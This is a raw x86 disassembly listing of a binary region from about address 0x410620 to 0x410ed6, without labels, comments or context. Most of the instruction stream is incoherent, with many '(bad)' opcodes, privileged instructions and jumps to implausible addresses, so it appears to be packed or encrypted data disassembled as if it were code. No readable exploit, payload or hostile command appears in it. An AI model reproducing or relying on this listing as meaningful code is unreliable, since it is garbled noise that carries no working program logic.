  410620:	mov    eax,ds:0xced4f6da
  410625:	ret    
  410626:	je     0x410683
  410628:	aam    0xde
  41062a:	std    
  41062b:	les    edi,FWORD PTR [esi-0x3d]
  41062e:	mov    ah,0xcb
  410630:	jle    0x4105f5
  410632:	dec    bl
  410634:	jae    0x41068a
  410636:	jmp    FWORD PTR [esi+eiz*2+0x62baf83d]
  41063d:	(bad)  
  41063e:	(bad)  
  41063f:	pushf  
  410640:	xchg   esi,eax
  410641:	dec    ebp
  410642:	cld    
  410643:	mov    ebp,ecx
  410645:	inc    edx
  410646:	add    BYTE PTR [ebx+0x75],ah
  410649:	rol    BYTE PTR [edi],0x63
  41064c:	sbb    DWORD PTR [ecx-0x15],edi
  41064f:	loopne 0x4106c0
  410651:	(bad)  
  410652:	imul   esp,DWORD PTR [ebx+0x2],0xff14
	...
  410665:	add    dh,dh
  410667:	mov    bl,0xda
  410669:	or     edi,esi
  41066b:	pop    esi
  41066c:	les    ecx,FWORD PTR [eax-0x39a4ad5a]
  410672:	mov    eax,ds:0xd6ff026d
  410677:	mov    dh,0xda
  410679:	mov    ds:0xfec3fc45,al
  41067e:	mov    dh,0xf2
  410680:	ret    
  410681:	je     0x4106ee
  410683:	inc    esi
  410684:	push   cs
  410685:	ins    BYTE PTR es:[edi],dx
  410686:	sub    al,0xe4
  410688:	mov    ecx,0x2dae5fc1
  41068d:	mov    ecx,DWORD PTR [edi]
  41068f:	xor    BYTE PTR [edi+0x5873adfb],bh
  410695:	add    BYTE PTR [ecx+0x7d],bh
  410698:	ret    
  410699:	je     0x4106f6
  41069b:	push   ss
  41069c:	lods   al,BYTE PTR ds:[esi]
  41069d:	push   0xfffffffc
  41069f:	mov    bl,0x78
  4106a1:	inc    esp
  4106a2:	mul    DWORD PTR [edi]
  4106a4:	push   cs
  4106a5:	inc    eax
  4106a6:	cmp    eax,DWORD PTR ds:0xfad80428
  4106ac:	and    al,0xec
  4106ae:	and    eax,DWORD PTR ds:0x31630369
  4106b4:	and    al,0x2c
  4106b6:	push   esp
  4106b7:	dec    eax
  4106b8:	sub    BYTE PTR [esp+ebp*1],al
  4106bb:	lods   eax,DWORD PTR ds:[esi]
  4106bc:	fadd   QWORD PTR [ebx+eiz*2+0x5]
  4106c0:	loop   0x410685
  4106c2:	xor    BYTE PTR [edi+edx*1],bl
  4106c5:	lods   al,BYTE PTR ds:[esi]
  4106c6:	ins    DWORD PTR es:[edi],dx
  4106c7:	cmp    eax,0xc3a6
	...
  4106d8:	add    BYTE PTR [ebp*1+0x7b8c03e9],dl
  4106df:	add    BYTE PTR [ebp+0x53e94621],al
  4106e5:	mov    WORD PTR [edx],?
  4106e7:	icebp  
  4106e8:	stos   DWORD PTR es:[edi],eax
  4106e9:	push   ebx
  4106ea:	cwde   
  4106eb:	jge    0x4106b0
  4106ed:	test   BYTE PTR [edx+0x7],bl
  4106f0:	ret    
  4106f1:	jne    0x4106a3
  4106f3:	out    0x49,eax
  4106f5:	jecxz  0x4106f2
  4106f7:	call   0x5d847034
  4106fc:	neg    DWORD PTR [esi+edi*2]
  4106ff:	push   ebp
  410700:	ret    
  410701:	push   ebp
  410702:	mov    esp,0x494725a
  410707:	mov    esp,0x3d32457e
  41070c:	ret    
  41070d:	mov    bh,0xd
  41070f:	inc    ecx
  410710:	jge    0x4106db
  410712:	mov    esp,0xce8d632d
  410717:	sub    cl,BYTE PTR [eax]
  410719:	arpl   WORD PTR [edx+0x72],dx
  41071c:	mov    al,0xe1
  41071e:	rcl    BYTE PTR [eax],0x57
  410721:	sbb    al,0x42
  410723:	adc    DWORD PTR [ebx+eiz*2],eax
  410726:	add    eax,0xb99fcae9
  41072b:	call   0x466a33
  410730:	bound  ebp,QWORD PTR [edx+0x60b18309]
  410736:	xor    cl,BYTE PTR [ecx]
  410738:	adc    bl,BYTE PTR [edi]
  41073a:	out    dx,eax
  41073b:	rol    DWORD PTR [edx+0x0],1
	...
  41074a:	add    BYTE PTR [eax],al
  41074c:	scas   al,BYTE PTR es:[edi]
  41074d:	lds    ecx,FWORD PTR [ebx]
  41074f:	jmp    0xe9410ca9
  410754:	pusha  
  410755:	mov    al,0x60
  410757:	push   0x23
  410759:	adc    eax,0x906a3500
  41075e:	inc    esp
  41075f:	(bad)  
  410761:	adc    edi,edi
  410763:	xor    al,0x53
  410765:	mov    esp,0xcaf8f174
  41076a:	addr16 sahf 
  41076c:	mov    eax,ds:0x5be0fa86
  410771:	add    cl,BYTE PTR [ecx]
  410773:	and    al,0xcf
  410775:	scas   al,BYTE PTR es:[edi]
  410776:	inc    ebp
  410777:	sbb    DWORD PTR [edx+0x3a],edi
  41077a:	(bad)  
  41077b:	jle    0x41071e
  41077d:	or     al,0x45
  41077f:	jno    0x410799
  410781:	outs   dx,BYTE PTR ds:[esi]
  410782:	jg     0x41076d
  410784:	pusha  
  410785:	add    eax,0xf6b5eb75
  41078a:	and    BYTE PTR [edx+0x68],0x30
  41078e:	adc    eax,0x8abdab62
  410793:	mov    ah,0xc
  410795:	or     al,0xa4
  410797:	sub    ebx,DWORD PTR [eax-0x3c]
  41079a:	fcomip st,st(1)
  41079c:	out    dx,eax
  41079d:	inc    ecx
  41079e:	clc    
  41079f:	pusha  
  4107a0:	fwait
  4107a1:	mov    ecx,0x41dddaea
  4107a6:	clc    
  4107a7:	jb     0x410734
  4107a9:	mov    ecx,0x426450e
  4107ae:	ror    DWORD PTR [ecx],0x0
	...
  4107bd:	add    BYTE PTR [eax],al
  4107bf:	imul   ecx,DWORD PTR [esp+eax*2-0x3ae20ef],0xf983b900
  4107ca:	or     DWORD PTR [eax+ebx*4-0x77],esi
  4107ce:	inc    ebp
  4107cf:	inc    BYTE PTR [ebx+0xc770036]
  4107d5:	sub    eax,eax
  4107d7:	push   ecx
  4107d8:	shr    ecx,cl
  4107da:	push   es
  4107db:	push   ecx
  4107dc:	inc    edx
  4107dd:	clc    
  4107de:	mov    edx,DWORD PTR [edi-0x736a63b]
  4107e4:	adc    eax,0x75515500
  4107e9:	add    esp,0x667326f6
  4107ef:	mov    eax,DWORD PTR [ecx]
  4107f1:	cmp    DWORD PTR [ebp-0x72],eax
  4107f4:	cld    
  4107f5:	add    eax,0xc0cefa2b
  4107fa:	adc    BYTE PTR [edx+0x647433c5],cl
  410800:	inc    esi
  410801:	add    al,ch
  410803:	pop    ebp
  410804:	jmp    0x8df8:0x4213fffe
  41080b:	inc    edi
  41080c:	lds    ecx,FWORD PTR [esi-0x18]
  41080f:	push   ds
  410810:	in     eax,dx
  410811:	(bad)  
  410812:	(bad)  
  410813:	std    
  410814:	icebp  
  410815:	adc    edi,edi
  410817:	xchg   DWORD PTR [edx],ecx
  410819:	push   DWORD PTR [ebp-0x3e]
  41081c:	les    esi,FWORD PTR [ebx+0x8]
  41081f:	mov    ds:0xff662e,al
	...
  410830:	add    BYTE PTR [eax],al
  410832:	popf   
  410833:	or     al,al
  410835:	movzx  ebp,BYTE PTR [edi]
  410838:	(bad)  
  410839:	dec    DWORD PTR [edx-0x3b]
  41083c:	jae    0x41084a
  41083e:	ins    DWORD PTR es:[edi],dx
  41083f:	repnz idiv edi
  410842:	idiv   DWORD PTR [ecx-0x1a]
  410845:	stc    
  410846:	xlat   BYTE PTR ds:[ebx]
  410847:	(bad)  
  410848:	std    
  410849:	mov    eax,edi
  41084b:	or     DWORD PTR [ebx],edi
  41084d:	inc    ebp
  41084e:	arpl   WORD PTR [edi+ecx*1+0x2abc783],di
  410855:	add    BYTE PTR [ecx+edi*1],al
  410858:	pop    ss
  410859:	push   DWORD PTR [esi-0x4c]
  41085c:	stos   BYTE PTR es:[edi],al
  41085d:	mov    eax,ds:0x88bfb37c
  410862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410863:	mov    al,0xab
  410865:	jae    0x41084b
  410867:	lock mov bh,0x2a
  41086a:	mov    cl,0x36
  41086c:	inc    esi
  41086d:	hlt    
  41086e:	int3   
  41086f:	or     BYTE PTR [eax],bh
  410871:	data16 and ch,BYTE PTR [ebx+ecx*1-0x5451b02e]
  410879:	addr16 dec ecx
  41087b:	lods   al,BYTE PTR ds:[esi]
  41087c:	push   edx
  41087d:	jmp    FWORD PTR [esi]
  41087f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410880:	stos   BYTE PTR es:[edi],al
  410881:	mov    BYTE PTR [edi+0x6b],al
  410884:	mov    edi,0xbfb82efe
  410889:	je     0x4108f6
  41088b:	xchg   esp,eax
  41088c:	xor    esp,DWORD PTR [edi-0x6c]
  41088f:	xchg   edx,eax
  410890:	mov    edx,DWORD PTR [edi+esi*2+0x2f]
  410894:	std    
  410895:	inc    DWORD PTR [eax]
	...
  4108a3:	add    BYTE PTR [eax],al
  4108a5:	xrstor [ebx-0x481f15b9]
  4108ac:	mov    ah,BYTE PTR [esi-0x48]
  4108af:	sub    BYTE PTR [ecx+0x63],al
  4108b2:	das    
  4108b3:	stos   BYTE PTR es:[edi],al
  4108b4:	add    edx,DWORD PTR [edx]
  4108b6:	and    esi,DWORD PTR [esi]
  4108b8:	adc    al,0xb2
  4108ba:	push   edi
  4108bb:	ss clc 
  4108bd:	push   esp
  4108be:	fimul  DWORD PTR [edx]
  4108c0:	call   0xff00c849
  4108c5:	stos   BYTE PTR es:[edi],al
  4108c6:	mov    bl,0xc2
  4108c8:	je     0x41092b
  4108ca:	push   ebx
  4108cb:	out    0x50,al
  4108cd:	xor    al,0x7a
  4108cf:	mov    edx,0xaaeab6fe
  4108d4:	jns    0x410894
  4108d6:	add    eax,0x331dc026
  4108db:	sbb    eax,0x162190ab
  4108e0:	ror    BYTE PTR [edi+0x5],0xe9
  4108e4:	inc    ebx
  4108e5:	pop    ebp
  4108e6:	das    
  4108e7:	jmp    0x410895
  4108e9:	test   BYTE PTR fs:[ebx-0x49],bh
  4108ed:	hlt    
  4108ee:	xor    DWORD PTR [edi-0x54],ebp
  4108f1:	push   esp
  4108f2:	mov    eax,0x3fcbf73
  4108f7:	dec    ebp
  4108f8:	mov    edi,0xc023c0dd
  4108fd:	aam    0xb8
  4108ff:	call   0xf583e107
  410904:	mov    ah,0xb8
  410907:	call   0x41090f
	...
  410918:	arpl   WORD PTR [eax+0x3abcbc33],di
  41091e:	inc    ebp
  41091f:	mov    edi,0xc0238cad
  410924:	fwait
  410925:	ret    
  410926:	clc    
  410927:	add    esi,DWORD PTR [esi]
  410929:	mov    WORD PTR [edi+edx*2-0x7d1abd18],cs
  410930:	int3   
  410931:	or     eax,0x2907ac39
  410936:	xchg   BYTE PTR [edi+0x397dbde9],bh
  41093c:	addr16 mov ch,ch
  41093f:	mov    esi,0x475e14f7
  410944:	pop    edi
  410945:	test   bl,ah
  410947:	packsswb mm6,QWORD PTR [ecx]
  41094a:	out    dx,al
  41094b:	mov    esi,0x476409cf
  410950:	pop    ebx
  410951:	push   ebp
  410952:	dec    esi
  410953:	cmp    DWORD PTR [ebx-0x53],ebx
  410956:	pop    edx
  410957:	xor    BYTE PTR [eax+edi*4],bh
  41095a:	jno    0x4109a5
  41095c:	dec    edi
  41095d:	mov    ?,edi
  41095f:	lock test al,0x5
  410962:	add    cl,ch
  410964:	pusha  
  410965:	pop    eax
  410966:	leave  
  410967:	sub    esi,DWORD PTR [edi+0x5]
  41096a:	push   ebp
  41096b:	jb     0x410940
  41096d:	add    bl,0x1d
  410970:	fcom   DWORD PTR [eax+0x14]
  410973:	es popa 
  410975:	add    eax,0xec60e900
  41097a:	shl    esi,1
	...
  410988:	add    BYTE PTR [eax],al
  41098a:	add    BYTE PTR [ebx+0x60e90109],ch
  410990:	add    eax,0x8321550f
  410995:	jl     0x41098c
  410997:	pusha  
  410998:	xor    dl,BYTE PTR [ebx]
  41099a:	ficomp WORD PTR [ebx+0x7aea6a11]
  4109a0:	add    eax,0x87f8e96a
  4109a5:	inc    dh
  4109a7:	std    
  4109a8:	lods   al,BYTE PTR ds:[esi]
  4109a9:	sub    bl,ch
  4109ab:	pusha  
  4109ac:	add    eax,0x6533483
  4109b1:	jne    0x4109bd
  4109b3:	in     al,0x30
  4109b5:	adc    BYTE PTR [esi-0x5317f2a5],ah
  4109bb:	ds mov eax,0xb91b60fe
  4109c1:	(bad)  
  4109c2:	adc    al,0x6b
  4109c4:	sub    eax,DWORD PTR [eax]
  4109c6:	adc    ebp,DWORD PTR [ebx-0x76]
  4109c9:	inc    esp
  4109ca:	jge    0x4109dc
  4109cc:	lods   eax,DWORD PTR ds:[esi]
  4109cd:	data16 jbe 0x41097d
  4109d0:	mov    dh,0xe8
  4109d2:	jmp    0x6a410f39
  4109d7:	mov    ds:0x41d40209,eax
  4109dc:	mov    eax,0x320df974
  4109e1:	or     BYTE PTR [ecx-0x73],al
  4109e4:	pop    ds
  4109e5:	inc    DWORD PTR [eax]
  4109e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e8:	mov    DWORD PTR [ebx-0x4],eax
  4109eb:	jne    0x4109ea
  4109ed:	adc    ebp,DWORD PTR [edx+0x0]
	...
  4109fc:	add    BYTE PTR [eax],al
  4109fe:	cmp    ch,ch
  410a00:	add    ecx,DWORD PTR [ebp-0x17b18901]
  410a06:	add    al,0x78
  410a08:	std    
  410a09:	push   DWORD PTR [ebx-0x31]
  410a0c:	(bad)  
  410a0d:	(bad)  
  410a0e:	cli    
  410a0f:	cmp    DWORD PTR [ebx+0xc],0xfffffff9
  410a13:	std    
  410a14:	pop    ds
  410a15:	(bad)  
  410a16:	jg     0x410a2a
  410a18:	push   0x3
  410a1a:	cmc    
  410a1b:	out    dx,al
  410a1c:	pop    es
  410a1d:	call   0x3feac0
  410a22:	cmc    
  410a23:	out    dx,al
  410a24:	adc    ebp,DWORD PTR [edx-0x37]
  410a27:	in     al,dx
  410a28:	jmp    FWORD PTR [ecx-0x36]
  410a2b:	push   0x16
  410a2d:	push   DWORD PTR [ebp-0x444e1888]
  410a33:	add    al,BYTE PTR [eax]
  410a35:	and    DWORD PTR [edi],0x15
  410a38:	add    al,0x75
  410a3a:	imul   edi,DWORD PTR [eax+0x73],0x7eef510
  410a41:	call   0x3fe93c
  410a46:	adc    edi,DWORD PTR [esi]
  410a48:	cld    
  410a49:	jmp    FWORD PTR [edi+0x1d]
  410a4c:	push   0x0
  410a4e:	pusha  
  410a4f:	or     eax,0x51d6458d
  410a54:	call   0xfdb9ef48
  410a59:	jmp    0x410c50
  410a5e:	stc    
  410a5f:	cmc    
  410a60:	or     eax,DWORD PTR ds:0x0
	...
  410a6e:	add    BYTE PTR [eax],al
  410a70:	add    BYTE PTR [edi+0x11],ch
  410a73:	push   DWORD PTR [ebp+0x5a]
  410a76:	in     al,dx
  410a77:	add    eax,0xe80a2fff
  410a7c:	push   ebp
  410a7d:	arpl   si,ax
  410a7f:	mov    ebx,0x2ad0bfe
  410a84:	add    BYTE PTR [ebx+0x55],ah
  410a87:	sub    DWORD PTR [ecx],eax
  410a89:	arpl   WORD PTR [edi+edi*2+0x35a65f7c],bp
  410a90:	and    BYTE PTR [ecx+esi*2],ah
  410a93:	adc    ch,BYTE PTR [edx+0x6b]
  410a96:	fbstp  TBYTE PTR [esi]
  410a98:	or     BYTE PTR [ebx],cl
  410a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a9b:	and    al,0xff
  410a9d:	or     al,0xf
  410a9f:	aaa    
  410aa0:	adc    al,0x79
  410aa2:	stos   DWORD PTR es:[edi],eax
  410aa3:	sub    BYTE PTR [eax],al
  410aa5:	mov    DWORD PTR [edx+ebp*4-0x44490a55],ebp
  410aac:	call   0x43b857
  410ab1:	loopne 0x410adb
  410ab3:	sysret 
  410ab5:	push   esi
  410ab6:	or     al,0xbd
  410ab8:	je     0x410b2d
  410aba:	push   edx
  410abb:	or     al,0xff
  410abd:	push   esi
  410abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410abf:	stos   BYTE PTR es:[edi],al
  410ac0:	adc    DWORD PTR ds:0x36febbc7,edi
  410ac6:	fsubr  DWORD PTR [eax]
  410ac8:	add    ecx,DWORD PTR [ecx-0x54]
  410acb:	sub    BYTE PTR [eax],al
  410acd:	mov    ebx,0xa4febd25
  410ad2:	les    ebx,FWORD PTR [ebx]
  410ad4:	add    DWORD PTR [eax],eax
	...
  410ae2:	add    BYTE PTR [eax],al
  410ae4:	arpl   WORD PTR [edi+edi*2+0x35b4677c],bp
  410aeb:	sbb    al,0xa4
  410aed:	call   0xabc60ab1
  410af2:	add    bh,bh
  410af4:	not    bh
  410af6:	sub    BYTE PTR [eax],al
  410af8:	or     DWORD PTR [eax+0x1b6f448d],esp
  410afe:	lods   al,BYTE PTR ds:[esi]
  410aff:	arpl   WORD PTR [ebp+0x26],sp
  410b02:	mov    esp,0xe9065ee8
  410b07:	add    esp,DWORD PTR [ebx-0x78]
  410b0a:	fisttp DWORD PTR [edi]
  410b0c:	pop    edx
  410b0d:	cmp    dh,ch
  410b0f:	les    ebx,FWORD PTR [edi+0x6303e7b1]
  410b15:	add    eax,0x1f4f3646
  410b1a:	jmp    0xabc37248
  410b1f:	mov    edi,0xbdaa9d94
  410b24:	sbb    eax,0x14d80fb5
  410b29:	mov    ch,0xe8
  410b2b:	or     BYTE PTR [edi+0x5936e301],0x6d
  410b32:	call   0x10466e3a
  410b37:	enter  0xb4f4,0xe8
  410b3b:	sub    BYTE PTR [edi+0x1],0xe2
  410b3f:	ss pop ecx
  410b41:	ins    DWORD PTR es:[edi],dx
  410b42:	call   0xd0466e4a
  410b47:	jg     0x410b49
	...
  410b55:	add    BYTE PTR [eax],al
  410b57:	aam    0xb4
  410b59:	call   0xe5425ae4
  410b5e:	xor    eax,0x30bb002e
  410b63:	adc    al,BYTE PTR [esi+0x5630843]
  410b69:	sub    DWORD PTR [edx],eax
  410b6b:	xor    BYTE PTR ds:0x845731b6,bh
  410b71:	and    esi,DWORD PTR [eax+0x89d22e1]
  410b77:	mov    dl,0x22
  410b79:	xchg   ebp,eax
  410b7a:	mov    ebx,0x8680b917
  410b7f:	cli    
  410b80:	mov    bl,0x8d
  410b82:	lea    esp,[edi]
  410b84:	lods   eax,DWORD PTR ds:[esi]
  410b85:	test   DWORD PTR [ecx],esi
  410b87:	push   ebx
  410b88:	mov    ah,0xf3
  410b8a:	scas   eax,DWORD PTR es:[edi]
  410b8b:	ins    DWORD PTR es:[edi],dx
  410b8c:	cmp    al,BYTE PTR [eax]
  410b8e:	jno    0x410b38
  410b90:	cmp    DWORD PTR [eax],ecx
  410b92:	adc    edx,0x1866ff28
  410b98:	cmp    DWORD PTR [ebx+edx*8],edx
  410b9b:	data16 mov ah,0x74
  410b9e:	pop    ebp
  410b9f:	or     BYTE PTR [ecx],bh
  410ba1:	clc    
  410ba2:	inc    ecx
  410ba3:	push   ss
  410ba4:	mov    cl,0xfe
  410ba6:	inc    esi
  410ba7:	clc    
  410ba8:	cmp    al,bh
  410baa:	push   ecx
  410bab:	sub    BYTE PTR [esi],bl
  410bad:	push   DWORD PTR [esi]
  410baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb0:	add    eax,0xa060e900
  410bb5:	pop    edi
  410bb6:	push   0x5a
  410bb8:	add    DWORD PTR ds:0x9b,ecx
	...
  410bca:	mov    bl,0x0
  410bcc:	rcr    BYTE PTR [edi+ebp*4+0x60dd7c86],cl
  410bd3:	add    eax,0x3d2def40
  410bd8:	push   DWORD PTR [esp+eiz*2-0x7c]
  410bdc:	inc    esp
  410bdd:	std    
  410bde:	frstor [eax]
  410be0:	hlt    
  410be1:	fdiv   QWORD PTR [edi-0x6c190be0]
  410be7:	mov    ecx,0xb47d06e7
  410bec:	(bad)  
  410bed:	pusha  
  410bee:	and    ebp,DWORD PTR [ebp-0x4ba8ab02]
  410bf4:	je     0x410bb3
  410bf6:	stc    
  410bf7:	cmp    al,bh
  410bf9:	mov    esi,0x13e7fd73
  410bfe:	xor    DWORD PTR [esi+edi*8+0x6a1953ae],0xffffffe8
  410c06:	fnstcw WORD PTR [eax]
  410c08:	hlt    
  410c09:	sahf   
  410c0a:	push   ebx
  410c0b:	lods   eax,DWORD PTR ds:[esi]
  410c0c:	out    0x1f,eax
  410c0e:	retf   0xfeb2
  410c11:	mov    ?,WORD PTR [ebx]
  410c13:	lods   eax,DWORD PTR ds:[esi]
  410c14:	out    0x0,eax
  410c16:	out    0xe0,al
  410c18:	(bad)  
  410c19:	jmp    DWORD PTR [edx]
  410c1b:	or     DWORD PTR [eax],eax
  410c1d:	add    BYTE PTR [edx+0x62],bh
  410c20:	add    edi,DWORD PTR [eax+0x74a]
  410c26:	xchg   ebx,eax
  410c27:	enter  0xe,0x17
  410c2b:	test   dl,ch
  410c2d:	push   esi
	...
  410c3a:	add    BYTE PTR [eax],al
  410c3c:	add    BYTE PTR [ecx+0x170007ed],bh
  410c42:	push   es
  410c43:	pop    esi
  410c44:	leave  
  410c45:	mov    BYTE PTR [edx-0x1087502],dh
  410c4b:	jmp    0x23b9:0xe6b46d0a
  410c52:	jo     0x410c51
  410c54:	add    DWORD PTR [edx+esi*4-0x7f],0x3e
  410c59:	cli    
  410c5a:	cmc    
  410c5b:	lock jmp edi
  410c5e:	(bad)  
  410c5f:	out    0xa9,eax
  410c61:	jecxz  0x410cd2
  410c63:	std    
  410c64:	pop    esi
  410c65:	xor    ecx,eax
  410c67:	add    al,BYTE PTR [eax]
  410c69:	xlat   BYTE PTR ds:[ebx]
  410c6a:	sub    edx,0xffffff8b
  410c6d:	mov    bh,0xfe
  410c6f:	mov    dl,BYTE PTR [ebp-0x42]
  410c72:	add    DWORD PTR [edx],0xffffff90
  410c75:	dec    ecx
  410c76:	cli    
  410c77:	(bad)  
  410c79:	ss add al,0x8b
  410c7c:	push   ebp
  410c7d:	retf   0x2e6d
  410c80:	(bad)
  410c84:	adc    al,0xca
  410c86:	loop   0x410c8f
  410c88:	mov    edx,DWORD PTR [edi+0x15]
  410c8b:	push   DWORD PTR [eax-0x4a]
  410c8e:	jge    0x410c90
  410c90:	or     DWORD PTR [edi+0x11],0x0
  410c94:	je     0x410c29
  410c96:	adc    DWORD PTR [ebx+0x18],0x83007c4a
  410c9d:	arpl   WORD PTR [esi+0xc90a],bx
	...
  410caf:	add    BYTE PTR [ecx-0x17aafd48],ah
  410cb5:	cwde   
  410cb6:	test   bl,al
  410cb8:	(bad)  
  410cb9:	sbb    edx,DWORD PTR [edx-0x75]
  410cbc:	push   ds
  410cbd:	int3   
  410cbe:	mov    edi,0x29c5cff
  410cc3:	add    al,ch
  410cc5:	pusha  
  410cc6:	push   es
  410cc7:	(bad)  
  410cc8:	arpl   WORD PTR [edx+eax*1+0x371f6300],bx
  410ccf:	or     BYTE PTR [ebx-0x27],ah
  410cd2:	or     ch,BYTE PTR [ebx]
  410cd4:	and    ebp,DWORD PTR [edx+0x57]
  410cd7:	leave  
  410cd8:	and    DWORD PTR [eax-0x5b5100fe],esp
  410cde:	stos   BYTE PTR es:[edi],al
  410cdf:	inc    DWORD PTR [ebx+0x230ab8e3]
  410ce5:	xchg   ecx,eax
  410ce6:	or     ch,BYTE PTR [ebx]
  410ce8:	and    esi,DWORD PTR [edx+0x57]
  410ceb:	leave  
  410cec:	and    DWORD PTR [eax+0x14a68902],ebp
  410cf2:	mov    ecx,0xe146b74
  410cf7:	arpl   sp,bp
  410cf9:	mov    dl,0xbf
  410cfb:	inc    esp
  410cfc:	out    dx,eax
  410cfd:	pushf  
  410cfe:	add    al,BYTE PTR [eax]
  410d00:	arpl   WORD PTR [ecx+0x3f],dx
  410d03:	in     al,dx
  410d04:	xor    edi,DWORD PTR [ecx]
  410d06:	ds hlt 
  410d08:	xor    edx,ebx
  410d0a:	sub    eax,0xbc72bb08
  410d0f:	(bad)  
  410d10:	mov    esp,0xec3f14
	...
  410d21:	add    BYTE PTR [eax],al
  410d23:	sub    al,0xb6
  410d25:	cmp    DWORD PTR [edi+esi*4-0x65],0x2e
  410d2a:	add    al,0x58
  410d2c:	mov    gs,WORD PTR [esi]
  410d2e:	or     BYTE PTR [eax+0x5c],cl
  410d31:	pop    eax
  410d32:	pop    edi
  410d33:	stos   BYTE PTR es:[edi],al
  410d34:	add    al,0xab
  410d36:	pop    es
  410d37:	arpl   si,bx
  410d39:	and    ebp,DWORD PTR [eax-0x7d7eb825]
  410d3f:	call   FWORD PTR [eax+ebp*8-0xfb3cfd]
  410d46:	or     edi,DWORD PTR [eax]
  410d48:	lds    ebx,FWORD PTR [esi]
  410d4a:	pop    ecx
  410d4b:	call   0x814a:0xe803e4c6
  410d52:	ret    0x434
  410d55:	mov    ecx,0x5e1e3bab
  410d5a:	mov    eax,0x8c554adb
  410d5f:	xor    al,0xc9
  410d61:	mov    ds:0xe8b1349f,eax
  410d66:	add    edi,DWORD PTR [eax]
  410d68:	cmc    
  410d69:	imul   edi,DWORD PTR [esi],0x33
  410d6c:	push   esi
  410d6d:	fs ds pop ss
  410d70:	push   esi
  410d71:	cs imul ebx,DWORD PTR cs:[ebp-0x4ef2425b],0x71
  410d7a:	inc    esi
  410d7b:	adc    ebp,ebp
  410d7d:	mov    ds:0xe20975ab,eax
  410d82:	aad    0x70
  410d84:	adc    eax,0x2e06
	...
  410d95:	add    bh,ch
  410d97:	popf   
  410d98:	dec    eax
  410d99:	sub    esp,esp
  410d9b:	mov    al,0xc1
  410d9d:	ret    
  410d9e:	ds push eax
  410da0:	and    ch,al
  410da2:	push   0xbb491005
  410da7:	mov    al,0x23
  410da9:	mov    al,ds:0xac5384f9
  410dae:	mov    esp,0x3782e73a
  410db3:	mov    ecx,0x84a230e8
  410db8:	cmp    ebp,DWORD PTR [esp+eiz*4-0x1e10ffc7]
  410dbf:	xor    esp,esi
  410dc1:	jmp    0x1d402319
  410dc6:	retf   
  410dc7:	test   al,0x70
  410dc9:	adc    esp,ecx
  410dcb:	scas   eax,DWORD PTR es:[edi]
  410dcc:	sub    ch,BYTE PTR [ecx-0x5436afeb]
  410dd2:	imul   eax,DWORD PTR ds:0xb0c30483,0x73
  410dd9:	in     al,0xb7
  410ddb:	jnp    0x410ddc
  410ddd:	call   0xd9858a42
  410de2:	or     eax,0x6776e439
  410de7:	jl     0x410e2d
  410de9:	inc    ebp
  410dea:	push   ds
  410deb:	rol    BYTE PTR [ecx],1
  410ded:	mov    ecx,0x4e682508
  410df2:	in     al,dx
  410df3:	jl     0x410e39
  410df5:	and    eax,0x72dc30d8
	...
  410e06:	add    BYTE PTR [eax],al
  410e08:	add    BYTE PTR [edx-0x4f],dh
  410e0b:	jmp    0xa226:0xcf7b8b91
  410e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e13:	(bad)  
  410e14:	call   0xa4ce1379
  410e19:	sar    BYTE PTR [edi],0x8d
  410e1c:	lods   al,BYTE PTR ds:[esi]
  410e1d:	int3   
  410e1e:	aas    
  410e1f:	push   edx
  410e20:	push   cs
  410e21:	xor    bh,ch
  410e23:	out    0x16,eax
  410e25:	test   al,0xae
  410e27:	(bad)  
  410e28:	repnz and BYTE PTR [esp+ecx*1],dh
  410e2c:	push   0xffffff9a
  410e2e:	mov    ecx,0x82d674ff
  410e33:	jl     0x410dfe
  410e35:	pusha  
  410e36:	cmp    ah,BYTE PTR [esi]
  410e38:	push   0xffffff8b
  410e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e3b:	call   FWORD PTR [edi+ebp*2-0x50]
  410e3f:	je     0x410e0a
  410e41:	or     BYTE PTR [edx],cl
  410e43:	push   0xfd76a500
  410e48:	jne    0x410e10
  410e4a:	pop    ebx
  410e4b:	sub    dh,bh
  410e4d:	aad    0x76
  410e4f:	std    
  410e50:	jne    0x410e18
  410e52:	pop    ebx
  410e53:	hlt    
  410e54:	lds    esi,FWORD PTR [bp+0x29]
  410e58:	rol    BYTE PTR [eax+ebx*2-0x37],0xc2
  410e5d:	xchg   BYTE PTR [ebx],al
  410e5f:	mov    eax,DWORD PTR [ebp-0x16]
  410e62:	sbb    bh,dh
  410e64:	dec    ebp
  410e65:	fiadd  WORD PTR [edx-0x20851b85]
  410e6b:	add    eax,0x83
	...
  410e7c:	push   edi
  410e7d:	pop    edi
  410e7e:	(bad)  
  410e7f:	je     0x410e27
  410e81:	jnp    0x410ec6
  410e83:	or     al,0xc5
  410e85:	cmc    
  410e86:	fisttp DWORD PTR [edi-0x38c87c6]
  410e8c:	mov    ds:0xa5ff65bb,al
  410e91:	sub    al,BYTE PTR [eax]
  410e93:	add    BYTE PTR [edx],bh
  410e95:	add    ebx,DWORD PTR [esi+0x5f]
  410e98:	jae    0x410e5e
  410e9a:	or     al,BYTE PTR [eax]
  410e9c:	(bad)  
  410e9d:	jnp    0x410e89
  410e9f:	cmp    DWORD PTR [esi],0xffffffba
  410ea2:	push   ebp
  410ea3:	add    edi,0x12
  410ea6:	add    BYTE PTR [ebp+0x10],dh
  410ea9:	sub    eax,DWORD PTR [eax]
  410eab:	add    BYTE PTR [edx],cl
  410ead:	add    ebx,DWORD PTR [edi-0x37]
  410eb0:	dec    eax
  410eb1:	(bad)  
  410eb2:	(bad)  
  410eb3:	(bad)  
  410eb4:	mov    bh,0x12
  410eb6:	sub    edx,edx
  410eb8:	jno    0x410eff
  410eba:	adc    bh,dh
  410ebc:	scas   eax,DWORD PTR es:[edi]
  410ebd:	fisub  WORD PTR [ebp+0x41]
  410ec0:	retf   0x4381
  410ec3:	lock xor BYTE PTR [ecx],cl
  410ec6:	push   DWORD PTR [ebp-0x56]
  410ec9:	js     0x410f3e
  410ecb:	or     BYTE PTR [ebx-0x3c],ah
  410ece:	sbb    DWORD PTR [edi-0x4c],ebx
  410ed1:	mov    edi,0x9c537c80
  410ed6:	sub    eax,0x289d390c
